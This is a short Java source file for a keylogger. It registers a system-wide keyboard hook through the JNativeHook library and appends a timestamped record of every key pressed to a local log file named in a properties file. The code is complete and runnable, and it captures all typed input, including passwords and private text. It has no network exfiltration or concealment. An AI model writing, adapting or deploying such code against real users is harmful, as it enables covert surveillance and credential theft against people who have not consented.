/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package keylogger;

import java.io.*;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Properties;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

/**
 *
 * @author S D Singh
 */
public class Keylogger implements NativeKeyListener {

    private String configFilePath = null;
    private InputStream inputStream = null;
    private Properties properties = null;
    private PrintStream fileStream = null;
    private SimpleDateFormat formatter;
    
    public Keylogger() throws IOException
    {
        formatter = new SimpleDateFormat("dd-MM-yyyy::HH:mm:ss");
        inputStream = new FileInputStream("Config.properties");
        properties = new Properties();
        properties.load(inputStream);
        configFilePath = properties.getProperty("FilePath");
        fileStream = new PrintStream(new FileOutputStream(configFilePath, true));
        fileStream.println("===============================================================================");
    }
    
    /**
     * @param args the command line arguments
     */
    public static void main(String[] args) throws IOException, NativeHookException {
        GlobalScreen.registerNativeHook();
        GlobalScreen.addNativeKeyListener(new Keylogger());
        
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent nke) {
        String s = NativeKeyEvent.getKeyText(nke.getKeyCode());
        fileStream.println(formatter.format(new Date())+" key pressed : "+s);
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent nke) {
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent nke) {
    }
    
}
